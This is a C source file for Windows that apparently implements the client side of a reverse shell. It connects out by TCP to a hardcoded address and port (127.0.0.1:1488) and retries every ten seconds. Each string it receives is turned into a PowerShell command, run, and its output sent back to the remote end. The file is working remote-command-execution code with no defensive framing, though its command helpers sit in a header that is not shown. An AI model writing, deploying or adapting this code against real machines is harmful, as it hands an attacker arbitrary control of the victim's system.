#ifndef UNICODE
#define UNICODE
#endif 

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <string.h>
#include <io.h>
#include <fcntl.h>
#include <windows.h>

#include "commandservice.h"

#define MAX_SIZE 10000000

void start_life_cycle(const char *ip);

int main()
{
    _setmode(_fileno(stdout), _O_U16TEXT);
    _setmode(_fileno(stdin), _O_U16TEXT);

    while (1)
    {
        start_life_cycle("127.0.0.1");
        wprintf(L"End\n");
    }
    return 0;
}

void start_life_cycle(const char *ip)
{
    WSADATA ws;
    WSAStartup(MAKEWORD(2, 2), &ws);

    SOCKET soc = socket(AF_INET, SOCK_STREAM, 0);

    SOCKADDR_IN sai;
    memset(&sai, 0, sizeof(sai));
    sai.sin_family = AF_INET;
    sai.sin_port = htons(1488);

    sai.sin_addr.S_un.S_addr = inet_addr(ip);
    
    int result;
    while ((result = connect(
        soc, (const struct sockaddr *) &sai, sizeof(sai))) != 0)
        {
            Sleep(10000);
            wprintf(L"Cannot connect WSAE: %d, result: %d, LastError %d\n", WSAGetLastError(), result, GetLastError());
        }
    

    wchar_t *dataw = (wchar_t *) malloc(MAX_SIZE);
    unsigned char *datac = (unsigned char *) malloc(MAX_SIZE);
    int written_bytes = 0;

    memset(dataw, 0, MAX_SIZE);
    memset(datac, 0, MAX_SIZE);

    int reciered;
    int sended;
    while ((reciered = recv(soc, datac, MAX_SIZE, 0)) > 0)
    {     

        if (!strcmp("bye\n", (const char *) datac))
        {
            closesocket(soc);
            free(datac);
            free(dataw);
            return;
        }

        int nibites = MultiByteToWideChar(CP_UTF8, 0, datac, -1, NULL, 0);
            int iconverted = MultiByteToWideChar(
                CP_UTF8, 0, datac, -1, dataw, nibites);
        to_powershell_command(dataw);
        execute_powershell_command(dataw, datac, &written_bytes);
        Sleep(1000);
        sended = send(soc, datac, written_bytes, 0);
        wprintf(L"Send return: %d, WSAE: %d, last erorr: %d\n", sended, WSAGetLastError(), GetLastError());
    }
    
    return;
}
